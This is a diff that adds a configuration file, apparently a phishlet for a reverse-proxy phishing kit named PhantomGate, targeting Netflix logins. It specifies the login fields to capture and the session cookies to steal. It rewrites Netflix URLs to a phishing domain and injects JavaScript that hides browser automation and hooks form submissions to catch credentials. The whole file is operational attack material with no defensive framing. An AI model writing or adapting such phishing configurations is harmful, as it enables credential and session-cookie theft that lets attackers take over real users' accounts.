@@ -1,0 +1,67 @@
+name: Netflix
+author: PhantomGate
+version: 2.0.0
+description: Netflix authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - netflix.com
+    - www.netflix.com
+    - account.netflix.com
+  
+  login:
+    domain: www.netflix.com
+    path: /login
+    username:
+      selector: "input#id_userLoginId"
+      capture: true
+    password:
+      selector: "input#id_password"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: SecureNetflixId
+        regex: ".*"
+      - name: NetflixId
+        regex: ".*"
+      - name: netflix-sess
+        regex: ".*"
+      - name: SecureNetflixId
+        regex: ".*"
+      - name: nfvdid
+        regex: ".*"
+      - name: JSESSIONID
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: netflix.com
+      inject: true
+    - domain: www.netflix.com
+      inject: true
+  
+  sub_filters:
+    - domain: netflix.com
+      search: "https://www.netflix.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - Netflix
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('#id_userLoginId');
+        var password = form.querySelector('#id_password');
+        if (username && password) {
+          console.log('[PhantomGate] Netflix credentials captured');
+        }
+      }, true);
+    })();
